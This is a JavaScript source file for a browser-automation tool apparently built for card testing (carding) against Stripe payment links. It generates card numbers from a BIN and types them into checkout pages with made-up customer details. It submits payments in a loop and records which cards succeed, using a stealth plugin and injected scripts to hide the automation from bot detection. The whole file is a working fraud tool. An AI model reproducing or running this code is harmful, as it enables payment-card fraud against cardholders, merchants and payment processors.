const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const { EventEmitter } = require('events');
const CardGenerator = require('./card-generator');

puppeteer.use(StealthPlugin());

class StripeAutomation extends EventEmitter {
    constructor() {
        super();
        this.browser = null;
        this.page = null;
        this.isRunning = false;
        this.currentCardIndex = 0;
        this.successfulCards = [];
        this.failedCards = [];
    }

    async start(config) {
        const { paymentLink, bin, quantity, delay, autoRefresh } = config;
        
        this.isRunning = true;
        this.emit('status', { message: '🔧 Launching browser...', step: 'browser' });

        // Launch browser with stealth mode
        this.browser = await puppeteer.launch({
            headless: 'new',
            args: [
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--disable-dev-shm-usage',
                '--disable-accelerated-2d-canvas',
                '--no-first-run',
                '--no-zygote',
                '--disable-gpu',
                '--disable-blink-features=AutomationControlled',
                '--window-size=1920,1080'
            ],
            executablePath: process.env.PUPPETEER_EXECUTABLE_PATH || null
        });

        this.emit('status', { message: '✅ Browser launched', step: 'browser-ready' });

        // Generate cards if BIN provided
        let cards = [];
        if (bin && bin.length >= 6) {
            this.emit('status', { message: `🎲 Generating ${quantity} cards with BIN ${bin}...`, step: 'generate' });
            cards = CardGenerator.generateCards(bin, quantity);
            this.emit('cards-ready', { cards, count: cards.length });
        } else {
            this.emit('status', { message: '⚠️ No valid BIN provided, using test cards', step: 'test-cards' });
            cards = this.getTestCards();
        }

        // Process each card
        for (let i = 0; i < cards.length && this.isRunning; i++) {
            this.currentCardIndex = i;
            const card = cards[i];
            
            this.emit('progress', {
                current: i + 1,
                total: cards.length,
                card: card.number.slice(-4),
                message: `Processing card ${i + 1}/${cards.length}`
            });

            try {
                const result = await this.processCard(paymentLink, card, delay);
                
                if (result.success) {
                    this.successfulCards.push({ card, result });
                    this.emit('result', {
                        success: true,
                        card: card.number,
                        message: result.message,
                        details: result.details
                    });
                } else {
                    this.failedCards.push({ card, error: result.error });
                    this.emit('result', {
                        success: false,
                        card: card.number,
                        message: result.error,
                        details: result.details
                    });
                }

                // Check for session expiry
                if (result.sessionExpired && autoRefresh) {
                    this.emit('session-expired', { card: card.number, link: paymentLink });
                    break;
                }

            } catch (error) {
                this.failedCards.push({ card, error: error.message });
                this.emit('result', {
                    success: false,
                    card: card.number,
                    message: error.message
                });
            }

            // Delay between attempts
            if (i < cards.length - 1 && this.isRunning) {
                await this.sleep(delay);
            }
        }

        this.emit('status', {
            message: `✅ Automation completed! Success: ${this.successfulCards.length}, Failed: ${this.failedCards.length}`,
            step: 'complete',
            stats: {
                total: cards.length,
                success: this.successfulCards.length,
                failed: this.failedCards.length
            }
        });

        await this.stop();
    }

    async processCard(paymentLink, card, delay) {
        this.page = await this.browser.newPage();
        
        // Set viewport and user agent
        await this.page.setViewport({ width: 1920, height: 1080 });
        await this.page.setUserAgent(
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        );

        // Inject anti-detection script
        await this.page.evaluateOnNewDocument(() => {
            Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
            Object.defineProperty(navigator, 'plugins', { get: () => [1, 2, 3, 4, 5] });
            window.chrome = { runtime: {} };
        });

        try {
            // Navigate to payment link
            this.emit('status', { message: '🌐 Navigating to payment page...', step: 'navigate' });
            await this.page.goto(paymentLink, { waitUntil: 'networkidle2', timeout: 30000 });

            // Check if session expired
            const sessionExpired = await this.page.evaluate(() => {
                const pageText = document.body.innerText.toLowerCase();
                return pageText.includes('expired') || 
                       pageText.includes('session') || 
                       pageText.includes('no longer available') ||
                       pageText.includes('invalid');
            });

            if (sessionExpired) {
                return { success: false, sessionExpired: true, error: 'Payment session expired' };
            }

            // Wait for Stripe elements to load
            await this.sleep(2000);

            // Fill card details using multiple selector strategies
            this.emit('status', { message: '💳 Filling card details...', step: 'fill-card' });
            
            await this.fillCardDetails(card);

            // Fill other required fields (email, name, etc.)
            await this.fillCustomerDetails();

            // Submit payment
            this.emit('status', { message: '📤 Submitting payment...', step: 'submit' });
            const submitResult = await this.submitPayment();

            await this.page.close();
            this.page = null;

            return submitResult;

        } catch (error) {
            if (this.page) {
                await this.page.close();
                this.page = null;
            }
            throw error;
        }
    }

    async fillCardDetails(card) {
        const cardSelectors = [
            // Stripe Elements iframe approach
            { type: 'iframe', selector: 'iframe[name*="card"], iframe[src*="stripe"]' },
            // Direct input approach
            { type: 'direct', number: '[name="cardnumber"], #card-number, [data-elements-stable-field-name="cardNumber"]', 
              expiry: '[name="exp-date"], #card-expiry, [data-elements-stable-field-name="cardExpiry"]',
              cvc: '[name="cvc"], #card-cvc, [data-elements-stable-field-name="cardCvc"]' },
            // Alternative selectors
            { type: 'alt', number: 'input[placeholder*="card"], input[placeholder*="Card"]',
              expiry: 'input[placeholder*="MM"], input[placeholder*="exp"]', 
              cvc: 'input[placeholder*="CVC"], input[placeholder*="cvc"], input[placeholder*="CVV"]' }
        ];

        let filled = false;

        for (const strategy of cardSelectors) {
            if (strategy.type === 'iframe') {
                try {
                    const frames = await this.page.frames();
                    for (const frame of frames) {
                        try {
                            // Try to fill card number
                            const cardInput = await frame.$('input[name="cardnumber"], input[placeholder*="card"]');
                            if (cardInput) {
                                await cardInput.type(card.number, { delay: 50 });
                                
                                // Fill expiry
                                const expInput = await frame.$('input[name="exp-date"], input[placeholder*="MM"]');
                                if (expInput) {
                                    await expInput.type(card.expiry, { delay: 50 });
                                }
                                
                                // Fill CVC
                                const cvcInput = await frame.$('input[name="cvc"], input[placeholder*="CVC"]');
                                if (cvcInput) {
                                    await cvcInput.type(card.cvc, { delay: 50 });
                                }
                                
                                filled = true;
                                break;
                            }
                        } catch (e) {}
                    }
                    if (filled) break;
                } catch (e) {}
            } else if (strategy.type === 'direct' || strategy.type === 'alt') {
                try {
                    const numberInput = await this.page.$(strategy.number);
                    if (numberInput) {
                        await numberInput.type(card.number, { delay: 50 });
                        
                        if (strategy.expiry) {
                            const expInput = await this.page.$(strategy.expiry);
                            if (expInput) await expInput.type(card.expiry, { delay: 50 });
                        }
                        
                        if (strategy.cvc) {
                            const cvcInput = await this.page.$(strategy.cvc);
                            if (cvcInput) await cvcInput.type(card.cvc, { delay: 50 });
                        }
                        
                        filled = true;
                        break;
                    }
                } catch (e) {}
            }
        }

        if (!filled) {
            // Last resort: try to find any input that looks like card fields
            await this.page.evaluate((cardNum, cardExpiry, cardCvc) => {
                const inputs = document.querySelectorAll('input');
                inputs.forEach(input => {
                    const placeholder = (input.placeholder || '').toLowerCase();
                    const name = (input.name || '').toLowerCase();
                    const id = (input.id || '').toLowerCase();
                    
                    if (placeholder.includes('card') || name.includes('card') || id.includes('card')) {
                        if (!placeholder.includes('exp') && !placeholder.includes('cvc') && !placeholder.includes('name')) {
                            input.value = cardNum;
                            input.dispatchEvent(new Event('input', { bubbles: true }));
                        }
                    }
                    if (placeholder.includes('mm') || placeholder.includes('exp') || name.includes('exp')) {
                        input.value = cardExpiry;
                        input.dispatchEvent(new Event('input', { bubbles: true }));
                    }
                    if (placeholder.includes('cvc') || placeholder.includes('cvv') || name.includes('cvc')) {
                        input.value = cardCvc;
                        input.dispatchEvent(new Event('input', { bubbles: true }));
                    }
                });
            }, card.number, card.expiry, card.cvc);
        }
    }

    async fillCustomerDetails() {
        const fakeData = this.generateFakeCustomerData();
        
        const fields = [
            { selector: 'input[type="email"], input[name="email"], input[placeholder*="email"]', value: fakeData.email },
            { selector: 'input[name="name"], input[placeholder*="name"], input[placeholder*="Name"]', value: fakeData.name },
            { selector: 'input[name="firstName"], input[placeholder*="First"]', value: fakeData.firstName },
            { selector: 'input[name="lastName"], input[placeholder*="Last"]', value: fakeData.lastName },
            { selector: 'input[name="phone"], input[type="tel"], input[placeholder*="phone"]', value: fakeData.phone },
            { selector: 'input[name="address"], input[placeholder*="Address"]', value: fakeData.address },
            { selector: 'input[name="city"], input[placeholder*="City"]', value: fakeData.city },
            { selector: 'input[name="postalCode"], input[placeholder*="ZIP"], input[placeholder*="Postal"]', value: fakeData.zip },
            { selector: 'input[name="country"], input[placeholder*="Country"]', value: fakeData.country }
        ];

        for (const field of fields) {
            try {
                const element = await this.page.$(field.selector);
                if (element) {
                    await element.type(field.value, { delay: 30 });
                    await this.sleep(100);
                }
            } catch (e) {}
        }
    }

    async submitPayment() {
        const submitSelectors = [
            'button[type="submit"]',
            'button:has-text("Pay")',
            'button:has-text("Submit")',
            'button:has-text("Complete")',
            'button:has-text("Continue")',
            'button.StripeElement',
            '[data-testid="submit-button"]',
            '.SubmitButton',
            'button[class*="submit"]',
            'button[class*="pay"]'
        ];

        for (const selector of submitSelectors) {
            try {
                let button;
                if (selector.includes(':has-text')) {
                    const text = selector.match(/"([^"]+)"/)[1];
                    button = await this.page.$x(`//button[contains(text(), '${text}')]`);
                    if (button.length > 0) button = button[0];
                } else {
                    button = await this.page.$(selector);
                }

                if (button) {
                    await button.click();
                    break;
                }
            } catch (e) {}
        }

        // Wait for result
        await this.sleep(3000);

        // Check result
        const result = await this.page.evaluate(() => {
            const pageText = document.body.innerText;
            return {
                success: pageText.includes('success') || 
                         pageText.includes('Thank you') || 
                         pageText.includes('confirmed') ||
                         pageText.includes('complete'),
                error: pageText.includes('declined') || 
                       pageText.includes('incorrect') ||
                       pageText.includes('invalid') ||
                       pageText.includes('expired'),
                message: pageText
            };
        });

        return {
            success: result.success,
            error: result.error ? 'Card declined or invalid' : null,
            details: result
        };
    }

    generateFakeCustomerData() {
        const firstNames = ['John', 'Jane', 'Michael', 'Sarah', 'David', 'Emma', 'Chris', 'Lisa'];
        const lastNames = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller', 'Davis'];
        const domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com'];
        
        const firstName = firstNames[Math.floor(Math.random() * firstNames.length)];
        const lastName = lastNames[Math.floor(Math.random() * lastNames.length)];
        const randomNum = Math.floor(Math.random() * 10000);
        
        return {
            firstName,
            lastName,
            name: `${firstName} ${lastName}`,
            email: `${firstName.toLowerCase()}.${lastName.toLowerCase()}${randomNum}@${domains[Math.floor(Math.random() * domains.length)]}`,
            phone: `+1${Math.floor(Math.random() * 9000000000 + 1000000000)}`,
            address: `${Math.floor(Math.random() * 9000 + 1000)} ${lastName} Street`,
            city: ['New York', 'Los Angeles', 'Chicago', 'Houston', 'Phoenix'][Math.floor(Math.random() * 5)],
            zip: Math.floor(Math.random() * 90000 + 10000).toString(),
            country: 'US'
        };
    }

    getTestCards() {
        return [
            { number: '4242424242424242', expiry: '1225', cvc: '123' },
            { number: '4000056655665556', expiry: '1225', cvc: '123' },
            { number: '5555555555554444', expiry: '1225', cvc: '123' },
            { number: '378282246310005', expiry: '1225', cvc: '1234' }
        ];
    }

    async checkSessionStatus(paymentLink) {
        const browser = await puppeteer.launch({
            headless: 'new',
            args: ['--no-sandbox', '--disable-setuid-sandbox']
        });
        
        try {
            const page = await browser.newPage();
            await page.goto(paymentLink, { waitUntil: 'networkidle2', timeout: 15000 });
            
            const status = await page.evaluate(() => {
                const pageText = document.body.innerText.toLowerCase();
                return {
                    expired: pageText.includes('expired') || pageText.includes('no longer available'),
                    valid: pageText.includes('pay') || pageText.includes('checkout') || pageText.includes('card'),
                    text: document.body.innerText.slice(0, 200)
                };
            });
            
            await browser.close();
            return status;
        } catch (error) {
            await browser.close();
            return { error: error.message };
        }
    }

    async stop() {
        this.isRunning = false;
        
        if (this.page) {
            try {
                await this.page.close();
            } catch (e) {}
            this.page = null;
        }
        
        if (this.browser) {
            try {
                await this.browser.close();
            } catch (e) {}
            this.browser = null;
        }
    }

    sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }
}

module.exports = StripeAutomation;
